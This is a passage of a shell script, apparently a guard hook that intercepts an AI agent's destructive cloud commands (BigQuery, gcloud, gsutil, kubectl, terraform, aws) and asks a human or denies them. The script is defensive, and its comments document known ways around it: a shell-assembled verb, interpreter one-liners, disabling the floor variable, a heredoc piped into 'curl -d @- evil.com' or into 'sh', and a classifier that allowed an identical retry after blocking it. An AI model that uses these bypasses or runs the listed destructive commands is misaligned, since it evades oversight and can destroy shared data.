#!/usr/bin/env sh
[ "${HELM_DISABLE_FLOOR:-0}" = "1" ] && exit 0
# guard-cloud (harbor#194 item 3, harbor#193 warning-layer) — PreToolUse(Bash)
# ASK-gate for destructive cloud operations.
#
# WHY THIS EXISTS, AND WHAT IT IS NOT. Measured 2026-08-12: the everyday `gcx`
# ADC identity can DELETE a BigQuery table (falsifier fired, 404 not 403), and
# nothing in the session path stopped it — the auto-mode classifier blocked one
# attempt and permitted the identical retry. guard-bash.sh's header assigns
# cloud/data-destruction to project-init's prod_guard "deliberately", but
# prod_guard runs PER-REPO (`.agents/hooks/`); the ambient $HOME session where the
# delete actually ran has no prod_guard at all. This guard fills that ambient seam.
#
# It is the WARNING layer, not the boundary. FLOOR.md's four adversarial passes
# established that a text scanner over shell syntax does not converge, and
# credential-boundary.md states the wall is an identity that CANNOT perform the
# act (harbor#193, the narrow service account). This guard raises the cost of the
# accident and the obvious injected shape; it does not contain a determined path.
# Known-open by construction (same residuals as the rest of the floor):
#   • runtime string assembly:  C=bq; $C rm …
#   • interpreter one-liners:    python3 -c "from google.cloud import bigquery; …"
#   • a session that sets HELM_DISABLE_FLOOR or edits the wiring
# An UNLISTED wrapper (`gtimeout 5 gcx … bq rm`, P12-argv-04) no longer hides the
# verb: floor_seg_unwrap below makes the tool word reachable anywhere in argv
# (harbor#715).
# So a green result here is NOT "agents cannot delete". It is "the direct spelling
# asks first". The boundary is harbor#193.
#
# POSTURE. Default is ASK (permissionDecision:"ask") — Claude Code prompts the
# human, which is the request: stop autonomous deletion, let a person approve a
# legitimate one. Set CLOUD_POSTURE=deny to hard-block instead (no in-prompt
# approve; the operator re-runs in a session launched with HELM_DISABLE_FLOOR=1).
# ASK is the default because a false positive on a hard block gets the whole floor
# switched off (§2.11), and destructive cloud verbs are rare enough that a
# confirmation costs almost nothing.
#
# BUT AN ASK IS TOOTHLESS OFF THE MAIN LOOP (harbor#194, measured 2026-08-13): a
# `bq rm`/`gcloud delete` issued from a Task/Agent subagent or a workflow
# EXECUTED with no prompt and no block, because there is no human to answer the
# ask — exactly where an unattended agent does damage. So the SOFT tier now
# AUTO-ESCALATES to deny when floor_no_human detects a subagent/workflow/
# autonomous caller (from the payload's transcript_path/agent_type/permission_
# mode), without touching the interactive main-loop ask. The CATASTROPHIC tier
# already denies always. This makes CLOUD_POSTURE=deny a manual override for the
# rare unattended session whose context the payload does not signal.
#
# FAIL-OPEN ON A NO-MATCH — but no longer on a missing tokenizer or an oversized
# payload, and this paragraph used to promise all three (harbor#306). A cloud guard
# that blocked all Bash on an awk hiccup is still the §2.11 disaster in its purest
# form, and nothing here does that: a call with no gated tool name in it is allowed
# exactly as before. What changed is that when the argv table is EMPTY, a command
# naming bq/gcloud/gsutil is no longer read as a command with no destructive verb
# in it. MEASURED: `bq rm -r -d` with 33,000 bytes of trailing comment was a silent
# allow. The population that can now be refused wrongly is the 0.0069% of real
# commands that exceed FLOOR_MAX_NORM at all (1 of 14,505 on this box).
set -eu
# harbor#810: no dirname fork. A failed or unresolvable $(dirname) left DIR at the cwd, sourcing ./guard-lib.sh.
case "$0" in */*) DIR="${0%/*}" ;; *) DIR=. ;; esac
DIR="$(CDPATH= cd -- "${DIR:-/}" && pwd)"
. "$DIR/guard-lib.sh"

floor_read_stdin
floor_shell_tool "$(floor_field '.tool_name')" || exit 0
CMD="$(floor_field '.tool_input.command')"
[ -n "$CMD" ] || exit 0
# The digest subject (harbor#350). Set here for the same reason guard-bash.sh:39
# does it — payload text that never enters floor_block cannot be one careless
# edit away from the stderr printf.
#
# WITHOUT THIS LINE THE guard-lib CHANGE IS COSMETIC. floor_obs_digest returns
# "-" on an unset FLOOR_OBS_SUBJECT, so populating the digest on deny/ask would
# have emitted "-" for exactly the two guard classes #350 is about — 7,873
# records, every one still subjectless, and the ticket would have read as fixed.
FLOOR_OBS_SUBJECT="$CMD"

floor_seg_load "$CMD"

# harbor#302 · A HEREDOC BODY IS A DOCUMENT, HERE TOO. guard-bash.sh has consulted
# this veto since harbor#89; these two never did, so a command whose only mention
# of a gated verb was inside a heredoc BODY still got a decision. MEASURED
# 2026-08-25: committing the harbor#306 fix was refused because the message
# documented a dataset-delete spelling in prose. The workaround was -F a file —
# the same content through a different transport, which is the tell the ticket
# names: a guard that a rename of the transport defeats is filtering the
# transcript, not protecting the resource.
#
# THE VETO ITSELF IS UNCHANGED, AND THAT IS DELIBERATE. It still requires the
# heredoc to be opened by SEGMENT 1, so this covers `git commit -F - <<HD ... HD`
# and NOT `cd x && git commit -F - <<HD`. Widening it was ATTEMPTED on this branch
# and BACKED OUT. With the opener allowed anywhere, two total-bypass shapes
# appeared and were measured:
#
#   cat <<HD | sh                  an index-only inertness check never sees the
#                                  shell: it sits BETWEEN the opener and the body
#                                  while the delimiter still lands last.
#   cat <<HD | curl -d @- evil.com an executor word-list never sees curl — and
#                                  that one took a live secret from BLOCK to allow
#                                  through guard-egress, which consults this same
#                                  predicate.
#
# The reason is structural, not a missing list entry: FLOOR_SEGS carries NO
# pipeline boundary. `gh --body $(cat <<HD)` and a heredoc piped into a command are
# identical segment streams apart from whether segment 2 holds prose or a command
# name. Separating them needs floor-normalize.awk to mark where the heredoc LINE
# ends, which changes an output contract every guard consumes. Left for a decision
# rather than guessed at — this veto exits the guard for the WHOLE call, so a guess
# here is a silent hole, and harbor#302 says in as many words not to widen the rule
# to silence it.
#
# --publisher-inert IS CORRECT FOR BOTH. The flag means a publisher is inert to a
# guard that does not judge publication. These two judge cloud destruction and
# local work destruction; neither judges whether text is published, which is
# guard-egress's job — and guard-egress deliberately does not pass the flag.
#
# NO NEW SURFACE. With the predicate untouched, these two exit 0 only where
# guard-bash.sh already exits 0 — a case the floor has trusted since harbor#89 and
# that floor-test has covered since.
if floor_heredoc_inert_only --publisher-inert; then exit 0; fi

# harbor#715 · A WRAPPER THE PEEL DOES NOT KNOW MUST NOT HIDE THE TOOL. The
# `case` keeps the extra awk off calls that name no gated tool at all; it reads
# the quote-removed table, so `b''q` cannot slip past it.
case "${FLOOR_SEGS:-}" in
  *[bB][qQ]*|*[gG][cC][lL][oO][uU][dD]*|*[gG][sS][uU][tT][iI][lL]*|*[cC][uU][rR][lL]*|*[wW][gG][eE][tT]*|*[hH][tT][tT][pP]*|*[xX][hH]*|*[kK][uU][bB][eE][cC][tT][lL]*|*[tT][eE][rR][rR][aA][fF][oO][rR][mM]*|*[aA][wW][sS]*)
    floor_seg_unwrap '^([^:]*/)?(bq|gcloud|gsutil|curl|wget|wget2|http|httpie|xh|kubectl|terraform|aws)$' ;;
esac

# Three tiers. CATASTROPHIC = irreversible on shared client infra (dataset/bucket/
# project deletion, IAM writes, REST DELETE to Google). SOFT = other destructive
# verbs. Both stop autonomous execution; the tier only changes the wording and,
# under CLOUD_POSTURE=deny, whether ASK degrades to DENY.
#
# IDENTITY (2026-09-15) is the third, and it is NOT a destruction tier — which is
# why it was missing for so long rather than broken. Measured with controls the
# day it was added: `gcloud auth login` was a silent allow here while `gcloud
# projects delete` denied. Correct, on the corpus as written: nothing about an
# auth change destroys anything. What it does is re-point the ACTIVE credential
# for every LATER command in the session, so the damage lands one command after
# the one a guard could have questioned, wearing somebody else's identity. It
# decides exactly like SOFT; it carries its own message because "confirm a HUMAN
# intends this on the named resource" is the wrong sentence for it.
#
# GTMSTD (2026-10-03) is a policy tier, not destruction: deny-always, see its rule.
REASON=""; TIER=""; SHAPE="argv"; BLIND=0
ID_HINT=""   # set only by the IDENTITY rules; declared here because set -u is on

# Case-insensitive SQL keyword fragments — floor_seg_has matches with `grep -Eq`
# (no -i) and an adversary lowercases to evade, so keywords are spelled as char
# classes. The whole quoted query is ONE arg token, so these match the SQL as an
# OPERAND of the bq-query segment: a commit message or a SELECT naming
# `dropped_events` is a different segment / carries no DROP<space>TABLE.
_S='[[:space:]]+'
_DROP='[Dd][Rr][Oo][Pp]'; _TRUNC='[Tt][Rr][Uu][Nn][Cc][Aa][Tt][Ee]'
_DEL='[Dd][Ee][Ll][Ee][Tt][Ee]'; _CRE='[Cc][Rr][Ee][Aa][Tt][Ee]'
_ORREP='[Oo][Rr]'"$_S"'[Rr][Ee][Pp][Ll][Aa][Cc][Ee]'
_TBL='[Tt][Aa][Bb][Ll][Ee]'; _VIEW='[Vv][Ii][Ee][Ww]'
_MATV='[Mm][Aa][Tt][Ee][Rr][Ii][Aa][Ll][Ii][Zz][Ee][Dd]'"$_S$_VIEW"
_FUNC='[Ff][Uu][Nn][Cc][Tt][Ii][Oo][Nn]'; _PROC='[Pp][Rr][Oo][Cc][Ee][Dd][Uu][Rr][Ee]'
_FROM='[Ff][Rr][Oo][Mm]'; _MERGE='[Mm][Ee][Rr][Gg][Ee]'
# Data-destroying DDL/DML — DROP of a data-bearing object, TRUNCATE, or a
# CREATE OR REPLACE TABLE that overwrites the old table's rows.
SQL_CATA="${_DROP}${_S}${_TBL}|${_DROP}${_S}[Ss][Cc][Hh][Ee][Mm][Aa]|${_DROP}${_S}${_MATV}|${_DROP}${_S}[Ss][Nn][Aa][Pp][Ss][Hh][Oo][Tt]${_S}${_TBL}|${_TRUNC}${_S}${_TBL}|${_CRE}${_S}${_ORREP}${_S}${_TBL}"
# Row / object-definition changes — narrower or time-travel-recoverable.
SQL_SOFT="${_DEL}${_S}${_FROM}|${_DROP}${_S}(${_VIEW}|${_FUNC}|${_PROC})|${_CRE}${_S}${_ORREP}${_S}(${_VIEW}|${_FUNC})|${_MERGE}.*[Tt][Hh][Ee][Nn]${_S}${_DEL}"

# ARMING AN EXPIRY IS NOT THE SAME AS CLEARING ONE, and the first cut of this
# rule could not tell them apart (Codex review of PR #209, both findings
# reproduced against this build and then verified against the CLI itself rather
# than against documentation):
#
#   • THE FLAG NAME WAS WRONG. `--time_partition_expiration` does not exist;
#     `bq help update` names it `--time_partitioning_expiration`. The rule
#     matched a spelling bq rejects, so the real flag walked straight through —
#     a gap in exactly the unattended path this change exists to close.
#   • THE `=` SPELLING ESCAPED. absl-flags takes `--expiration=3600`, and a
#     token anchored `^--expiration$` never sees it.
#   • ZERO CLEARS, IT DOES NOT ARM. `bq help update`: "Specifying 0 removes
#     expiration time" — so asking on `--expiration 0`, and hard-denying it in a
#     subagent, blocks the operator at the moment they are PREVENTING data loss.
#     §2.11 pointed backwards.
#
# THE CLEARING VALUE IS PER FLAG, measured from the help text, not assumed
# uniform: `--expiration`, `--default_table_expiration` and
# `--default_partition_expiration` all clear on "0", while
# `--time_partitioning_expiration` clears on a NEGATIVE number ("A negative
# number means no expiration"). Treating them alike would have re-introduced the
# same defect one flag over.
#
# EXEMPT, NEVER FIRE, is the direction: the rule fires on the flag being present
# and steps aside only when the adjacent value is provably the clearing one. An
# expanded or unrecognised value (`--expiration $SECS`) therefore stays
# destructive, so the exemption cannot be used to spell the number out of range.
_BQ_EXP_TOK='^--(expiration|default_table_expiration|default_partition_expiration)(=.*)?$'
_BQ_EXP_NAME='^--(expiration|default_table_expiration|default_partition_expiration)$'
_BQ_PEXP_TOK='^--time_partitioning_expiration(=.*)?$'
_BQ_PEXP_NAME='^--time_partitioning_expiration$'
_bq_arms_expiry() {
  if floor_seg_has '^([^:]*/)?bq$' '^update$' "$_BQ_EXP_TOK"; then
    if floor_seg_flagval '^([^:]*/)?bq$' "$_BQ_EXP_NAME" '^0+$'; then :; else return 0; fi
  fi
  if floor_seg_has '^([^:]*/)?bq$' '^update$' "$_BQ_PEXP_TOK"; then
    if floor_seg_flagval '^([^:]*/)?bq$' "$_BQ_PEXP_NAME" '^-[0-9]+$'; then :; else return 0; fi
  fi
  return 1
}

# HELP IS A READ, and it is computed here rather than inline because the rule
# chain below is one `if/elif` construct with nowhere to put a statement. Scoped
# to the IDENTITY arms only: `--help` next to a destructive verb is NOT exempted,
# because that corpus has not been reviewed for it and a help flag that silences
# a delete rule is a bypass wearing a read's clothes.
# `if/then` and not `cmd && var=1` — under `set -e` the second form ABORTS the
# whole guard the moment the predicate is false, which is the common case.
_ID_HELP=0
if floor_seg_has '^([^:]*/)?gcloud$' '^--help$|^-h$|^help$'; then _ID_HELP=1; fi

# GTMSTD: a Tag Manager version cut or publish OUTSIDE the standard's own version-cut
# command, which runs the never-worse gate first; a raw `:create_version` skips it,
# and `:publish` is the operator's, in the GTM UI. Deny-always. The command's exact
# form lives in the gtm skill (a pack note), not here: core names no company or sibling repo.
# Argv, never prose: the verb must sit in an HTTP client's or an interpreter's
# arguments, and document heredoc bodies (cat > f <<EOF, commit -F -) are dropped
# first with the reviewed primitive guard-deliverables uses — for this rule only.
_TM_HOST='[Tt][Aa][Gg][Mm][Aa][Nn][Aa][Gg][Ee][Rr]\.[Gg][Oo][Oo][Gg][Ll][Ee][Aa][Pp][Ii][Ss]\.[Cc][Oo][Mm]'
_TM_VERB=':(create_version|publish)([?#]|$)'
_TM_CLIENT='^([^:]*/)?(curl|wget|wget2|http|httpie|xh)$'
_TM_INTERP='^([^:]*/)?(python[0-9.]*|node|nodejs|bun|deno|ruby|perl)$'
# v1 has no colon verbs (PR #947 review): create is POST .../versions, publish is
# POST .../versions/{id}/publish. A v1 versions GET (a list) stays allowed.
_TM_V1PUB='/tagmanager/v1/.*/versions/[^/?#[:space:]]+/publish([?#]|$)'
_TM_V1VER='/tagmanager/v1/.*/versions([?#]|$)'
_TM_POST='^(POST|-XPOST|-d|--data|--data-raw|--data-binary|--data-urlencode|--json|-F|--form)$|^--data(-raw|-binary|-urlencode)?=|^--json='
# A verb the shell assembles (`:$A`, `:${A}`): what runs cannot be read from the text,
# so with the host or the gtm-write identity in the command it fails closed.
_TM_VARVERB=':[$][{]?[A-Za-z_]'
_tmflat() { printf '%s' "$_tmc" | "$FLOOR_GREP" -Eq -- "$1"; }
_gtm_version_call() {
  case "$CMD" in *:create_version*|*:publish*|*/v1/*|*':$'*) ;; *) return 1 ;; esac  # no fork on the hot path
  _tmc="$CMD"
  case "$CMD" in *'<<'*) _tmc="$(floor_hd_unwrap_doc_bodies --writers "$CMD")" ;; esac
  case "$_tmc" in *:create_version*|*:publish*|*/v1/*|*':$'*) ;; *) return 1 ;; esac
  _tmsegs="${FLOOR_SEGS:-}"; _tmscmd="${FLOOR_SEG_CMD:-}"
  if [ "$_tmc" != "$CMD" ]; then
    floor_seg_load "$_tmc"
    floor_seg_unwrap '^([^:]*/)?(bq|gcloud|gsutil|curl|wget|wget2|http|httpie|xh)$'
  fi
  _tmhit=1
  # A literal URL: the host and the verb in one client argument.
  if floor_seg_has "$_TM_CLIENT" "${_TM_HOST}/.*${_TM_VERB}"; then _tmhit=0
  # A URL built from a variable ("$B/workspaces/${W}:create_version"): the host or
  # the gtm-write identity named elsewhere in the same command.
  elif floor_seg_has "$_TM_CLIENT" "^\\\$[^[:space:]]*${_TM_VERB}" \
    && _tmflat "${_TM_HOST}|(^|[^[:alnum:]_-])gtm-write([^[:alnum:]_-]|$)"; then _tmhit=0
  # v1: publish by path; create by path plus a POST signal (method or body).
  elif floor_seg_has "$_TM_CLIENT" "${_TM_HOST}${_TM_V1PUB}"; then _tmhit=0
  elif floor_seg_has "$_TM_CLIENT" "${_TM_HOST}${_TM_V1VER}" "$_TM_POST"; then _tmhit=0
  # A verb assembled by the shell, with the host or the gtm-write identity in the command.
  elif floor_seg_has "$_TM_CLIENT" "$_TM_VARVERB" \
    && _tmflat "${_TM_HOST}|(^|[^[:alnum:]_-])gtm-write([^[:alnum:]_-]|$)"; then _tmhit=0
  # An interpreter: -c/-e code carrying both, or a heredoc script naming both.
  elif floor_seg_has "$_TM_INTERP" "$_TM_HOST" ":(create_version|publish)"; then _tmhit=0
  elif floor_seg_cmd "$_TM_INTERP" && _tmflat '<<' && _tmflat "$_TM_HOST" \
    && _tmflat ':(create_version|publish)'; then _tmhit=0
  fi
  FLOOR_SEGS="$_tmsegs"; FLOOR_SEG_CMD="$_tmscmd"
  return "$_tmhit"
}

if _gtm_version_call; then
  TIER=GTMSTD; REASON="a Tag Manager version cut or publish (:create_version / :publish) outside the standard's version-cut command — it skips the standard's gate"
# bq: `rm`/`truncate`, `query` running destructive SQL, and the overwrite/expiry
# verbs that carry NO delete token at all — the "rm is the only verb" assumption
# was FALSE: `bq query` runs arbitrary DDL/DML, `load/query --replace` and
# `cp -f` overwrite via WRITE_TRUNCATE, `--expiration` arms a silent server-side
# timer, and `mk --transfer_config` schedules a query that runs later unattended.
elif floor_seg_has '^([^:]*/)?bq$' '^query$' "$SQL_CATA"; then
  TIER=CATASTROPHIC; REASON="bq query destructive DDL (DROP/TRUNCATE TABLE, DROP MATERIALIZED VIEW/SNAPSHOT, CREATE OR REPLACE TABLE) — destroys BigQuery data"
elif floor_seg_has '^([^:]*/)?bq$' '^query$' "$SQL_SOFT"; then
  TIER=SOFT; REASON="bq query DELETE FROM / DROP VIEW·FUNCTION / CREATE OR REPLACE VIEW / MERGE…THEN DELETE — mutates rows or object definitions"
elif floor_seg_has '^([^:]*/)?bq$' '^truncate$'; then
  TIER=CATASTROPHIC; REASON="bq truncate — empties a BigQuery table/dataset to a timestamp (server-side)"
elif floor_seg_has '^([^:]*/)?bq$' '^load$' '^--replace$|^--replace=[Tt]rue$'; then
  TIER=CATASTROPHIC; REASON="bq load --replace — WRITE_TRUNCATE overwrites the destination table"
elif floor_seg_has '^([^:]*/)?bq$' '^query$' '^--replace$|^--replace=[Tt]rue$'; then
  TIER=CATASTROPHIC; REASON="bq query --replace — overwrites the destination table (WRITE_TRUNCATE)"
elif floor_seg_has '^([^:]*/)?bq$' '^cp$' '^-f$|^--force$|^--force=[Tt]rue$'; then
  TIER=CATASTROPHIC; REASON="bq cp -f — overwrites the destination table (WRITE_TRUNCATE, no prompt)"
elif floor_seg_has '^([^:]*/)?bq$' '^mk$' '^--transfer_config$|^--transfer_run$'; then
  TIER=SOFT; REASON="bq mk --transfer_config — schedules a server-side query that runs later, unattended"
elif _bq_arms_expiry; then
  TIER=SOFT; REASON="bq update --expiration — arms a timer that silently deletes data later (no delete line is ever logged)"
elif floor_seg_has '^([^:]*/)?bq$' '^rm$'; then
  if floor_seg_has '^([^:]*/)?bq$' '^rm$' '^-d$|^--dataset$|^-r$|^--recursive$'; then
    TIER=CATASTROPHIC; REASON="bq rm of a DATASET or recursive delete on shared BigQuery"
  else
    TIER=SOFT; REASON="bq rm (BigQuery table/model delete)"
  fi
# gcloud: IAM writes, SA-key minting, storage rm/rsync-delete, delete (tiered).
elif floor_seg_has '^([^:]*/)?gcloud$' '^set-iam-policy$|^add-iam-policy-binding$|^remove-iam-policy-binding$'; then
  TIER=CATASTROPHIC; REASON="gcloud IAM-policy write on shared identities (blast radius reaches colleagues)"
elif floor_seg_has '^([^:]*/)?gcloud$' '^keys$' '^create$'; then
  TIER=CATASTROPHIC; REASON="gcloud iam service-accounts keys create — mints a downloadable long-lived credential"
elif floor_seg_has '^([^:]*/)?gcloud$' '^rsync$' '^-[a-zA-Z]*d$|^--delete-unmatched-destination-objects$'; then
  TIER=CATASTROPHIC; REASON="gcloud storage rsync --delete — mirror-delete of destination objects"
elif floor_seg_has '^([^:]*/)?gcloud$' '^rm$'; then
  TIER=CATASTROPHIC; REASON="gcloud storage rm (object/bucket delete)"
elif floor_seg_has '^([^:]*/)?gcloud$' '^delete$' '^projects$|^buckets$'; then
  TIER=CATASTROPHIC; REASON="gcloud projects/buckets delete — irreversible on shared infra"
elif floor_seg_has '^([^:]*/)?gcloud$' '^delete$'; then
  TIER=SOFT; REASON="gcloud … delete"
elif floor_seg_has '^([^:]*/)?gcloud$' '^services$' '^disable$'; then
  TIER=SOFT; REASON="gcloud services disable — turning off an API silently breaks production data flows (destruction without a delete token)"
# gcloud IDENTITY: the active credential, not the resources it reaches.
#
# ORDER IS LOAD-BEARING TWICE OVER. These sit AFTER every destructive gcloud rule
# so that a command carrying both (`gcloud auth revoke && bq rm -r -d …`) keeps the
# destruction verdict — an identity ask must never soften a catastrophic deny. And
# the ADC arm sits BEFORE the plain-login arm because `auth application-default
# login` carries both `auth` and `login`: matched the other way round, the store
# that actually changed would be named wrong in the prompt, which is the single
# fact this rule exists to get right.
# THE REMEDY IS PER COMMAND, NOT PER TIER, and the first cut of this got it wrong
# in the way that mattered: every identity rule shared one tail saying "pin it:
# gcloud auth login <acct>", so the ADC rule — whose whole point is that ADC is a
# DIFFERENT store — told the reader to fix it with the CLI command. The message
# contradicted its own first sentence. Caught by rendering it, not by the suite,
# which is why ID_HINT now has content assertions of its own.
elif [ "$_ID_HELP" = 0 ] && floor_seg_has '^([^:]*/)?gcloud$' '^auth$' '^application-default$' '^login$'; then
  TIER=IDENTITY; REASON="gcloud auth application-default login — rewrites APPLICATION DEFAULT CREDENTIALS, the store libraries, dbt and the BigQuery SDKs read"
  ID_HINT="ADC is a SEPARATE store from the CLI credential: this does not change who bq/gcloud run as, and a broken CLI login is not fixed by it. Note which account you pick in the browser — ADC and the CLI can end up as different identities, and the mismatch surfaces later as a permissions error."
elif [ "$_ID_HELP" = 0 ] && floor_seg_has '^([^:]*/)?gcloud$' '^auth$' '^login$'; then
  TIER=IDENTITY; REASON="gcloud auth login — re-points the ACTIVE CLI account for every later bq/gcloud call in this session, and does NOT write ADC"
  ID_HINT="The browser does not necessarily default to the account above, and the wrong pick surfaces on the NEXT command rather than this one. Pin it rather than choosing in the browser."
elif [ "$_ID_HELP" = 0 ] && floor_seg_has '^([^:]*/)?gcloud$' '^auth$' '^revoke$'; then
  TIER=IDENTITY; REASON="gcloud auth revoke — removes a stored credential"
  ID_HINT="Anything still running as that account starts failing, and the failure reads as a permissions problem rather than as this command. Check what uses it before revoking."
elif [ "$_ID_HELP" = 0 ] && floor_seg_has '^([^:]*/)?gcloud$' '^config$' '^set$|^unset$' '^account$'; then
  TIER=IDENTITY; REASON="gcloud config set/unset account — re-points the active CLI account"
  ID_HINT="No browser, no output, no credential fetched: the switch is silent and the next command simply runs as somebody else."
elif [ "$_ID_HELP" = 0 ] && floor_seg_has '^([^:]*/)?gcloud$' '^configurations$' '^activate$'; then
  TIER=IDENTITY; REASON="gcloud config configurations activate — switches the whole active configuration"
  ID_HINT="Account and project move together, so a command that looks unchanged can hit a different project as a different identity."
# gsutil: rb, rm, rsync -d (mirror delete), iam/acl writes.
elif floor_seg_has '^([^:]*/)?gsutil$' '^rb$'; then
  TIER=CATASTROPHIC; REASON="gsutil rb (bucket delete)"
elif floor_seg_has '^([^:]*/)?gsutil$' '^rsync$' '^-[a-zA-Z]*d$'; then
  TIER=CATASTROPHIC; REASON="gsutil rsync -d — mirror-delete of destination objects"
elif floor_seg_has '^([^:]*/)?gsutil$' '^iam$|^acl$|^defacl$' '^set$|^ch$'; then
  TIER=CATASTROPHIC; REASON="gsutil iam/acl write — bucket/object permission change"
elif floor_seg_has '^([^:]*/)?gsutil$' '^rm$'; then
  TIER=SOFT; REASON="gsutil rm (object delete)"
# REST: DELETE (case-blind, method token only) / setIamPolicy at a Google API.
# Wider client set; the method is matched as a whole/glued token so a GET to a
# resource whose name contains "delete" does not false-positive.
elif floor_seg_has '^([^:]*/)?(curl|wget|wget2|http|httpie|xh)$' '^[Dd][Ee][Ll][Ee][Tt][Ee]$|[Xx][Dd][Ee][Ll][Ee][Tt][Ee]|method=[Dd][Ee][Ll][Ee][Tt][Ee]' 'googleapis\.com'; then
  TIER=CATASTROPHIC; REASON="HTTP DELETE against a Google API endpoint"
elif floor_seg_has '^([^:]*/)?(curl|wget|wget2|http|httpie|xh)$' ':setIamPolicy' 'googleapis\.com'; then
  TIER=CATASTROPHIC; REASON="setIamPolicy against a Google API endpoint"
# NON-GCP CLOUDS (harbor#1149): the review found kubectl, terraform and aws were not covered at all.
# SOFT-equivalent (ask, deny off the main loop), own tiers only so the ledger id names the class.
elif floor_seg_has '^([^:]*/)?kubectl$' '^delete$'; then
  TIER=NGKUBE; REASON="kubectl delete — removes cluster resources"
elif floor_seg_has '^([^:]*/)?terraform$' '^destroy$'; then
  TIER=NGTF; REASON="terraform destroy — tears down every resource in the state"
elif floor_seg_has '^([^:]*/)?terraform$' '^apply$' '^-{1,2}auto-approve(=.*)?$'; then
  TIER=NGTF; REASON="terraform apply -auto-approve — applies a plan (deletions included) with no confirmation"
elif floor_seg_has '^([^:]*/)?aws$' '^terminate-instances$'; then
  TIER=NGAWS; REASON="aws ec2 terminate-instances — irreversibly destroys EC2 instances"
elif floor_seg_has '^([^:]*/)?aws$' '^s3$' '^rb$'; then
  TIER=NGAWS; REASON="aws s3 rb — removes an S3 bucket"
elif floor_seg_has '^([^:]*/)?aws$' '^s3$' '^rm$' '^--recursive$'; then
  TIER=NGAWS; REASON="aws s3 rm --recursive — deletes every object under the prefix"
elif floor_seg_has '^([^:]*/)?aws$' '^delete-[a-z0-9-]+$'; then
  TIER=NGAWS; REASON="aws … delete-* — deletes an AWS resource"
fi

# --- THE ARGV LAYER WENT BLIND: deny-always must not degrade to allow -------
# harbor#306, the same defect and the same repair as guard-destroy.sh — see the
# long note there for the measurement. Every rule above is floor_seg_has, so the
# whole table vanishes when floor_seg_load returns nothing, with exit 0 and no
# output. MEASURED 2026-08-25: `bq rm -r -d proj:dataset` and a `gcloud
# add-iam-policy-binding` were both SILENT ALLOWS with 33,000 bytes of trailing
# comment, while guard-bash.sh denied an identically padded 'rm -rf /'.
#
# THE TOOL NAME, NOT A SECOND COPY OF SIXTEEN RULES. This tier is much wider than
# guard-destroy's one verb family, which makes the case against mirroring stronger,
# not weaker: sixteen flat EREs restating sixteen argv rules is sixteen copies to
# drift. The question asked here is the only one answerable with no tokenizer —
# does the executed text name a gated tool at all.
#
# THE REST FAMILY KEEPS BOTH OF ITS ANCHORS. curl/wget appear in ordinary work far
# more than bq or gsutil do, and the catastrophic REST rules were never about curl
# — they are about a DELETE or a setIamPolicy reaching a Google endpoint. So the
# degraded form still requires googleapis.com to be present. That is the rule's own
# second anchor, not a re-implementation of its verb matching.
#
# COARSER THAN THE ARGV TIER, ON PURPOSE AND AT A MEASURED PRICE. A degraded
# `bq ls` denies here where the argv layer would allow it, because with no table
# there is no way to tell `ls` from 'rm -r -d'. Over 14,505 real Bash commands on
# this box exactly ONE exceeded FLOOR_MAX_NORM (0.0069%), so that is the size of the
# population this can be wrong about — and each one gets a named reason and a
# remedy, against a silent allow on dataset deletion.
if [ -z "$TIER" ] && floor_seg_degraded; then
  # Called only in this branch: floor_bash_targets forks awk, and the allow path
  # must not pay for a diagnostic it will never emit. Over the cap it returns the
  # raw command, which is the input this needs.
  _CT="$(floor_bash_targets "$CMD")"
  _cfhit() { printf '%s' "$_CT" | "$FLOOR_GREP" -iEq -- "$1"; }
  _cblind=""
  if _cfhit '(^|[^[:alnum:]_./-])([a-zA-Z0-9_./-]*/)?bq([[:space:]]|$)';     then _cblind="bq"
  elif _cfhit '(^|[^[:alnum:]_./-])([a-zA-Z0-9_./-]*/)?gcloud([[:space:]]|$)'; then _cblind="gcloud"
  elif _cfhit '(^|[^[:alnum:]_./-])([a-zA-Z0-9_./-]*/)?gsutil([[:space:]]|$)'; then _cblind="gsutil"
  elif _cfhit '(^|[^[:alnum:]_./-])([a-zA-Z0-9_./-]*/)?(curl|wget|wget2|http|httpie|xh)([[:space:]]|$)' \
    && _cfhit 'googleapis\.com';                                            then _cblind="an HTTP client against googleapis.com"
  fi
  if [ -n "$_cblind" ]; then
    TIER=CATASTROPHIC; BLIND=1; SHAPE="flat"
    REASON="the argv tokenizer could not parse this call (over the ${FLOOR_MAX_NORM}-byte normalizer cap, nested past what the normalizer expands, or awk/floor-normalize.awk unavailable) and the command names $_cblind, whose dataset/bucket/project deletes and IAM writes are deny-always — so the guard cannot tell a read from an irreversible delete on shared client infrastructure. Re-run it under the cap, or the operator runs it themselves as a \`!\` command, which is not a tool call"
  fi
fi

[ -n "$TIER" ] || exit 0   # no destructive cloud verb — allow

# Decision. The CATASTROPHIC tier — dataset/bucket/project delete, IAM writes,
# raw REST DELETE — DENIES ALWAYS, regardless of posture. These are irreversible
# on shared CLIENT infrastructure, and an ASK auto-approves in an unattended
# session, which is the exact failure this guard exists for. The operator who
# genuinely means one runs it in a session launched with HELM_DISABLE_FLOOR=1.
# The SOFT tier (single-table rm, generic `gcloud … delete`) asks; CLOUD_POSTURE
# =deny escalates the soft tier too, for fully unattended sessions.
# NO-HUMAN AUTO-ESCALATION (harbor#194, the subagent finding). An `ask` prompts
# the main-loop human, but MEASURED 2026-08-13 it AUTO-APPROVES with no prompt
# when the caller is a subagent/workflow/autonomous session — so the SOFT tier
# was toothless exactly where an unattended agent operates. floor_no_human
# detects that context (transcript under /subagents/, agent_type, or an
# autonomous permission_mode) and escalates the ask to deny, WITHOUT changing the
# interactive main-loop path (fail-safe toward "human present" — see guard-lib).
# CLOUD_POSTURE=deny still forces deny globally for a session the operator knows
# is unattended and whose context signals it cannot read.
NOHUMAN=0; floor_no_human && NOHUMAN=1
if [ "$TIER" = CATASTROPHIC ] || [ "$TIER" = GTMSTD ]; then DECISION="deny"
elif [ "$NOHUMAN" = 1 ]; then DECISION="deny"
elif [ "${CLOUD_POSTURE:-ask}" = "deny" ]; then DECISION="deny"
else DECISION="ask"; fi

_NHNOTE=""
[ "$TIER" != CATASTROPHIC ] && [ "$TIER" != GTMSTD ] && [ "$NOHUMAN" = 1 ] && _NHNOTE=" [no-human context — an ask would auto-approve here, so escalated to deny; a human runs this from an interactive session]"
# PER SHAPE, because the argv tail is FALSE for the degraded block: "Reads
# (ls/query/show/describe/get-*) are never gated" stops being true exactly when the
# tokenizer cannot see which verb it is, and that sentence is the first thing a
# reader would use to conclude the block was a bug.
if [ "$BLIND" = 1 ]; then
  MSG="$REASON."
elif [ "$TIER" = GTMSTD ]; then
